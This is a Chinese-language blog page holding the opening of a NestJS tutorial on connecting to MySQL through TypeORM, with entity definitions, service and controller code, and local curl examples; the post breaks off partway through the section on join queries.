<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">



  <meta name="google-site-verification" content="vz1PrlmOl-C4FBrH_at-JOEneuzGOz7AfXa3QVThvy8">








  <meta name="baidu-site-verification" content="code-4IMpMXQpb6">







  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">



  <link rel="icon" type="image/png" sizes="32x32" href="/img/favicon.ico?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/img/favicon.ico?v=5.1.4">






  <meta name="keywords" content="gdccwxx">










<meta name="description" content="ä¸ªäººåšå®¢åˆ†äº«ï¼Œçƒ­çˆ±ç”Ÿæ´»ï¼Œçƒ­çˆ±æ¢ç´¢">
<meta property="og:type" content="website">
<meta property="og:title" content="gdccwxx">
<meta property="og:url" content="https://blog.gdccwxx.com/index.html">
<meta property="og:site_name" content="gdccwxx">
<meta property="og:description" content="ä¸ªäººåšå®¢åˆ†äº«ï¼Œçƒ­çˆ±ç”Ÿæ´»ï¼Œçƒ­çˆ±æ¢ç´¢">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="gdccwxx">
<meta name="twitter:description" content="ä¸ªäººåšå®¢åˆ†äº«ï¼Œçƒ­çˆ±ç”Ÿæ´»ï¼Œçƒ­çˆ±æ¢ç´¢">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_header":"slideDownIn","post_body":"slideDownIn"}},
    duoshuo: {
      userId: 'undefined',
      author: 'åšä¸»'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://blog.gdccwxx.com/">





  <title>gdccwxx - :)</title>
  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-118405225-1', 'auto');
  ga('send', 'pageview');
</script>





</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">gdccwxx</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">:)</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            é¦–é¡µ
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            å…³äº
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            æ ‡ç­¾
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            å½’æ¡£
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/nestJs/nest-js-tutorial-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/nestJs/nest-js-tutorial-3/" itemprop="url">NestJs å…¥é—¨æ•™ç¨‹ä¹‹ä¸‰ï¼šæ•°æ®åº“</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2021-09-12T17:16:56+08:00">
                2021-09-12
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>è¿™ä¸ªç³»åˆ—çš„<a href="/nestJs/nest-js-tutorial-2/" title="ä¸Šä¸€ç¯‡">ä¸Šä¸€ç¯‡</a>æ–‡ç« ï¼Œå®ç°äº† <code>Post</code> æ¥å£å’Œå¯¹æ¥å£çš„åŸºç¡€æ“ä½œã€‚</p>
<p>æœ¬ç¯‡ä¸»è¦è®²çš„æ˜¯å’Œæ•°æ®åº“è¿æ¥ï¼Œä½¿ç”¨æ•°æ®åº“è”è¡¨æŸ¥è¯¢å’Œæ“ä½œè®°å½•ã€‚ä½¿ç”¨æ•°æ®åº“å°†æ•°æ®è®°å½•ï¼Œå°±æ˜¯ä¸€ä¸ªå®Œæ•´çš„åå°æœåŠ¡äº†ã€‚</p>
<p>å®Œæ•´ç¤ºä¾‹å¯ä»¥åœ¨ <a href="https://github.com/gdccwxx/nest-test" target="_blank" rel="noopener">github</a> æ‰¾åˆ°ã€‚</p>
<p><img src="/nestJs/nest-js-tutorial-3/./nestjs.png" alt="nestjs"></p>
<p>æœ¬ç¯‡ä½¿ç”¨ <code>mysql</code> ä½œä¸ºæ•°æ®åº“è¿æ¥ã€‚ä½¿ç”¨ <code>NestJs</code> å†…ç½®çš„<a href="https://docs.nestjs.com/techniques/database" target="_blank" rel="noopener">æ•°æ®åº“è¿æ¥</a> <code>typeorm</code>ï¼Œå¯åœ¨ <a href="https://typeorm.io/" target="_blank" rel="noopener">è¿™é‡Œ</a> æŸ¥é˜… typeorm è¯¦ç»†æ–‡æ¡£</p>
<h1 id="ä¸€ã€å¼€å‘å‡†å¤‡"><a href="#ä¸€ã€å¼€å‘å‡†å¤‡" class="headerlink" title="ä¸€ã€å¼€å‘å‡†å¤‡"></a>ä¸€ã€å¼€å‘å‡†å¤‡</h1><ol>
<li><a href="https://dev.mysql.com/downloads/mysql/" target="_blank" rel="noopener">ä¸‹è½½</a>å¹¶å®‰è£… Mysql</li>
<li><p>åˆ›å»º school åº“</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database school;</span><br></pre></td></tr></table></figure>
</li>
<li><p>å®‰è£… @nestjs/typeorm typeorm mysql2</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save @nestjs/typeorm typeorm mysql2</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="äºŒã€æ•°æ®åº“è¿æ¥"><a href="#äºŒã€æ•°æ®åº“è¿æ¥" class="headerlink" title="äºŒã€æ•°æ®åº“è¿æ¥"></a>äºŒã€æ•°æ®åº“è¿æ¥</h1><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// app.module.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Module &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; AppController &#125; <span class="keyword">from</span> <span class="string">'./app.controller'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; AppService &#125; <span class="keyword">from</span> <span class="string">'./app.service'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; StudentsController &#125; <span class="keyword">from</span> <span class="string">'./students/students.controller'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; TypeOrmModule &#125; <span class="keyword">from</span> <span class="string">'@nestjs/typeorm'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">  imports: [</span><br><span class="line">    StudentsModule,</span><br><span class="line">    TypeOrmModule.forRoot(&#123;</span><br><span class="line">      <span class="keyword">type</span>: <span class="string">'mysql'</span>,</span><br><span class="line">      host: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">      port: <span class="number">3306</span>,</span><br><span class="line">      username: <span class="string">'root'</span>,</span><br><span class="line">      password: <span class="string">'1qaz2wsx'</span>,</span><br><span class="line">      database: <span class="string">'school'</span>,</span><br><span class="line">      autoLoadEntities: <span class="literal">true</span>,</span><br><span class="line">      synchronize: <span class="literal">true</span>, <span class="comment">// æ•°æ®åº“è‡ªåŠ¨åŒæ­¥ entity æ–‡ä»¶ä¿®æ”¹</span></span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  controllers: [AppController],</span><br><span class="line">  providers: [AppService],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> AppModule &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>åˆå§‹åŒ–æ•°æ®åº“è¿æ¥ã€‚</p>
<p><code>autoLoadEntities</code> è‡ªåŠ¨åŒ– load entity æ–‡ä»¶, æ‰€æœ‰åœ¨ Module ä¸­å¼•ç”¨çš„ Entity æ–‡ä»¶ä¼šè¢«è‡ªåŠ¨åŠ è½½ã€‚è‡ªåŠ¨åŠ è½½è®¾ç½®ä¸º true å³å¯ã€‚</p>
<p><code>synchronize</code> è‡ªåŠ¨åŒ–åŒæ­¥è¡¨ï¼Œæœ¬åœ°å¯è‡ªåŠ¨æ‰“å¼€ï¼Œçº¿ä¸Šæ•°æ®åº“ä¸å»ºè®®æ‰“å¼€ã€‚</p>
<h1 id="ä¸‰ã€å®šä¹‰è¡¨ç»“æ„"><a href="#ä¸‰ã€å®šä¹‰è¡¨ç»“æ„" class="headerlink" title="ä¸‰ã€å®šä¹‰è¡¨ç»“æ„"></a>ä¸‰ã€å®šä¹‰è¡¨ç»“æ„</h1><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    Entity,</span><br><span class="line">    Column,</span><br><span class="line">    PrimaryGeneratedColumn,</span><br><span class="line">    UpdateDateColumn,</span><br><span class="line">    CreateDateColumn,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">'typeorm'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> Student &#123;</span><br><span class="line">  <span class="meta">@PrimaryGeneratedColumn</span>()</span><br><span class="line">  id: <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Column</span>(&#123; <span class="keyword">type</span>: <span class="string">'varchar'</span> &#125;)</span><br><span class="line">  name: <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@UpdateDateColumn</span>()</span><br><span class="line">  updateDate: <span class="built_in">Date</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@CreateDateColumn</span>()</span><br><span class="line">  createDate: <span class="built_in">Date</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>@Entity</code> æ³¨è§£ä»£è¡¨æ˜¯æ•°æ®åº“å…¥å£æ–‡ä»¶ï¼›</li>
<li><code>@Column</code> æ˜¯åŸºç¡€åˆ—æ–‡ä»¶ï¼Œä½¿ç”¨ <code>type</code> å­—æ®µå®šä¹‰åœ¨æ•°æ®åº“å®é™…å­˜å‚¨</li>
<li><code>@PrimaryGeneratedColumn</code> ä»£è¡¨å•è°ƒé€’å¢çš„ä¸»é”®</li>
<li><code>@UpdateDateColumn</code> å½“è®°å½•ä¿®æ”¹æ—¶ä¼šä¿®æ”¹æ—¶é—´</li>
<li><code>@CreateDateColumn</code> å½“è®°å½•æ–°å¢æ—¶ä¼šå†™å…¥æ—¶é—´</li>
</ul>
<h1 id="å››ã€å¼•ç”¨è¡¨"><a href="#å››ã€å¼•ç”¨è¡¨" class="headerlink" title="å››ã€å¼•ç”¨è¡¨"></a>å››ã€å¼•ç”¨è¡¨</h1><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.module.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Module &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Student &#125; <span class="keyword">from</span> <span class="string">'./entities/students.entity'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; TypeOrmModule &#125; <span class="keyword">from</span> <span class="string">'@nestjs/typeorm'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; StudentsController &#125; <span class="keyword">from</span> <span class="string">'./students.controller'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; StudentsService &#125; <span class="keyword">from</span> <span class="string">'./students.service'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Module</span>(&#123;</span><br><span class="line">    imports: [TypeOrmModule.forFeature([Student])],</span><br><span class="line">    providers: [StudentsService, Student],</span><br><span class="line">    controllers: [StudentsController],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsModule &#123;&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>imports</code> å¼•ç”¨ typeorm æ¨¡å—ï¼Œ entity æ‰å¯ä»¥åœ¨ service ä¸­ä½¿ç”¨</li>
<li><code>providers</code> service çš„ constructor éœ€è¦å¼•ç”¨å“ªäº›æ¨¡å—</li>
<li><code>controllers</code> æ¨¡å—çš„ controller</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.service.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Injectable, Logger &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; InjectRepository &#125; <span class="keyword">from</span> <span class="string">'@nestjs/typeorm'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Repository &#125; <span class="keyword">from</span> <span class="string">'typeorm'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Student &#125; <span class="keyword">from</span> <span class="string">'./entities/students.entity'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsService &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">        <span class="meta">@InjectRepository</span>(Student)</span></span><br><span class="line"><span class="params">        <span class="keyword">private</span> readonly studentRepository: Repository&lt;Student&gt;,</span></span><br><span class="line"><span class="params">    </span>) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·ä¼šåœ¨ db ä¸­å»ºç«‹ students æ–°è¡¨ã€‚</p>
<p>ä½¿ç”¨ <code>show create table</code> èƒ½çœ‹è¡¨çš„è¯¦ç»†ä¿¡æ¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">use school;</span><br><span class="line"></span><br><span class="line">show tables;</span><br><span class="line"></span><br><span class="line">// =&gt; | student | CREATE TABLE `student` (</span><br><span class="line">//  `id` int NOT NULL AUTO_INCREMENT,</span><br><span class="line">//  `updateDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6) ON UPDATE CURRENT_TIMESTAMP(6),</span><br><span class="line">//  `createDate` datetime(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),</span><br><span class="line">//  `name` varchar(255) NOT NULL,</span><br><span class="line">//  PRIMARY KEY (`id`)</span><br><span class="line">// ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci |</span><br></pre></td></tr></table></figure>
<h1 id="äº”ã€ä¸æ•°æ®åº“äº¤äº’"><a href="#äº”ã€ä¸æ•°æ®åº“äº¤äº’" class="headerlink" title="äº”ã€ä¸æ•°æ®åº“äº¤äº’"></a>äº”ã€ä¸æ•°æ®åº“äº¤äº’</h1><p>åˆ°è¿™ä¸€æ­¥ï¼Œç»ˆäºå¯ä»¥å’Œæ•°æ®åº“è¿›è¡Œäº¤äº’äº†ã€‚åŸºæœ¬ä¸Šå’Œæ•°æ®åº“äº¤äº’çš„éƒ¨åˆ†éƒ½ä¼šæ”¾åœ¨ service å±‚ï¼Œå› æ­¤ <code>æ–°å¢</code> å’Œ <code>æŸ¥è¯¢</code> éƒ½æ”¾åœ¨ service å±‚ã€‚</p>
<p>å…¶ä¸­åŒ…æ‹¬äº†</p>
<ul>
<li><code>getStudentName</code> çš„æ”¹é€ </li>
<li><code>setStudent</code> å‡½æ•°çš„æ–°å¢</li>
</ul>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.service.ts</span></span><br><span class="line"><span class="comment">// import ...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsService &#123;</span><br><span class="line">    <span class="comment">// logger, constructor ImStudent getStudentName ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> getStudentName(id: <span class="built_in">number</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.logger.log(<span class="string">`get student id is <span class="subst">$&#123;id&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">const</span> results = <span class="keyword">await</span> <span class="keyword">this</span>.studentRepository.find(&#123; id &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> results ?? <span class="string">'not found'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> setStudent(name: <span class="built_in">string</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> results = <span class="keyword">this</span>.studentRepository.create(&#123; name &#125;);</span><br><span class="line">        <span class="keyword">return</span> results;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡ä½¿ç”¨ <code>find</code> å’Œ <code>create</code> å¯¹å­¦ç”ŸæŸ¥è¯¢å’Œåˆ›å»ºã€‚ç»“æœä¹Ÿæ˜¯å¼‚æ­¥çš„ã€‚</p>
<p>ä¸‹é¢å¯¹ <code>controller</code> è¿›è¡Œæ”¹é€ ï¼Œä½¿å¾—å‡½æ•°è°ƒç”¨ä¸²èµ·æ¥ã€‚</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// students.controller.ts</span></span><br><span class="line"><span class="comment">// import ...</span></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">'students'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsController &#123;</span><br><span class="line">    <span class="comment">// constructor whoAreYou whoAreYouPost whoIsReq ..</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Get</span>(<span class="string">'get-name-by-id'</span>)</span><br><span class="line">    getNameById(<span class="meta">@Query</span>(<span class="string">'id'</span>, ParseIntPipe) id: <span class="built_in">number</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.studentsService.getStudentName(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Post</span>(<span class="string">'set-student-name'</span>)</span><br><span class="line">    setStudentName(<span class="meta">@User</span>() user: <span class="built_in">string</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.studentsService.setStudent(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡å¯¹ <code>service</code> çš„è°ƒç”¨, å†ç» <code>controller</code> è°ƒç”¨äº§ç”Ÿå¦‚ä¸‹ç»“æœ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// å‘½ä»¤è¡Œè®¿é—®</span><br><span class="line">curl -X POST http://127.0.0.1:3000/students/<span class="built_in">set</span>-student-name -H <span class="string">'Content-Type: application/json'</span> -d <span class="string">'&#123;"user": "gdccwxx"&#125;'</span></span><br><span class="line">// =&gt; &#123;<span class="string">"name"</span>:<span class="string">"gdccwxx"</span>,<span class="string">"id"</span>:1,<span class="string">"updateDate"</span>:<span class="string">"2021-09-12T15:57:14.599Z"</span>,<span class="string">"createDate"</span>:<span class="string">"2021-09-12T15:57:14.599Z"</span>&#125;%  âœ…</span><br><span class="line"></span><br><span class="line">// æµè§ˆå™¨è®¿é—®</span><br><span class="line">http://localhost:3000/students/get-name-by-id?id=1</span><br><span class="line"></span><br><span class="line">// =&gt; [&#123;</span><br><span class="line">//  id: 1,</span><br><span class="line">//  name: <span class="string">"gdccwxx"</span>,</span><br><span class="line">//  updateDate: <span class="string">"2021-09-12T15:57:14.599Z"</span>,</span><br><span class="line">//  createDate: <span class="string">"2021-09-12T15:57:14.599Z"</span></span><br><span class="line">// &#125;]  âœ…</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡å¯¹ <code>service</code> çš„ saveã€find è°ƒç”¨ï¼Œå°±èƒ½å°†æ•°æ®å®Œæ•´å­˜å…¥æ•°æ®åº“äº†ã€‚</p>
<h1 id="å…­ã€è”è¡¨æŸ¥è¯¢"><a href="#å…­ã€è”è¡¨æŸ¥è¯¢" class="headerlink" title="å…­ã€è”è¡¨æŸ¥è¯¢"></a>å…­ã€è”è¡¨æŸ¥è¯¢</h1><p>æˆ‘ä»¬å‡†å¤‡æ–°å»ºè¯¾ç¨‹è¡¨<code>class</code>ï¼Œæ¯ä¸ªç­çº§å¯ä»¥æœ‰å¤šä¸ªå­¦ç”Ÿï¼Œä¸€ä¸ªå­¦ç”Ÿéš¶å±ä¸€ä¸ªç­çº§ã€‚</p>
<p>è¿™æ ·<code>å­¦ç”Ÿ</code>å’Œ<code>ç­çº§</code>å°±æ„æˆäº† <code>n:1</code> çš„å…³ç³»ã€‚</p>
<p>ä¸ºäº†æ–¹ä¾¿å±•ç¤ºï¼Œåœ¨å­¦ç”Ÿæ¨¡å—ä¸‹ç›´æ¥æ–°å¢ <code>class.entity.ts</code> æ–‡ä»¶ã€‚å¹¶é€šè¿‡ <code>@OneToMany</code> å…³è” <code>students</code>ã€‚</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// classes.entity.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; Entity, Column, PrimaryGeneratedColumn, UpdateDateColumn, CreateDateColumn, OneToMany &#125; <span class="keyword">from</span> <span class="string">'typeorm'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Student &#125; <span class="keyword">from</span> <span class="string">'./students.entity'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> Classes &#123;</span><br><span class="line">  <span class="meta">@PrimaryGeneratedColumn</span>()</span><br><span class="line">  id: <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Column</span>(&#123; <span class="keyword">type</span>: <span class="string">'varchar'</span> &#125;)</span><br><span class="line">  className: <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@OneToMany</span>(<span class="function"><span class="params">()</span> =&gt;</span> Student, <span class="function"><span class="params">student</span> =&gt;</span> student.class)</span><br><span class="line">  students: Student[]</span><br><span class="line"></span><br><span class="line">  <span class="meta">@UpdateDateColumn</span>()</span><br><span class="line">  updateDate: <span class="built_in">Date</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@CreateDateColumn</span>()</span><br><span class="line">  createDate: <span class="built_in">Date</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åŒæ—¶ä¿®æ”¹ <code>students.entity.ts</code>, é€šè¿‡ <code>@ManyToOne</code> å¼•å…¥ <code>Classes</code> ä¿®æ”¹</p>
